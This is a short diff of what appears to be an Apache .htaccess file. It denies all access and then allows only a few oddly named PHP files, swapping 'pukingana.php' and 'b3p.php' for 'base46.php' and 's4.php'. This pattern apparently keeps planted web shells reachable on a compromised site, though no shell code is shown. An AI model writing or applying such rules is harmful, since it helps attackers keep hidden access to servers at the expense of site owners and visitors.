@@ -6,7 +6,7 @@ Deny from all
 
 </FilesMatch>
 
-<FilesMatch "^(pukingana.php|b3p.php)$">
+<FilesMatch "^(base46.php|s4.php)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
